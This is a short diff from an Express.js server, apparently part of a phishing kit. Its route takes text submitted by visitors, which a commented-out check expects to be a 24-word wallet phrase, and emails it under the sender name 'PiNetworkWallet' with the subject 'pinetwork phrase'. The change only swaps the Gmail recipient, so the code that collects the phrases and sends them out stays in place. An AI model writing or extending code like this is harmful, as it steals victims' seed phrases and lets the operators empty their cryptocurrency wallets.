@@ -59,7 +59,7 @@ app.post("/submit/7668", async (req, res) => {
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet ",
-        to: ["mizetomilli@gmail.com"],
+        to: ["Pinetworkm493@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
